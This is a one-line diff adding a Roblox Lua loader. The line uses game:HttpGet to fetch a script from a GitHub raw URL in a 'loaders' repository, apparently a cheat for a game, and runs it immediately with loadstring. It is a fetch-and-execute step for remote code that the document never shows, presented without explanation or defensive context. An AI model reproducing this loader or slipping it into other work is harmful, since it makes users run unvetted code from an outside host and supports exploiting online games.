@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/slayers-2-spam4-8wspqtaeeemqfb.lua"))()
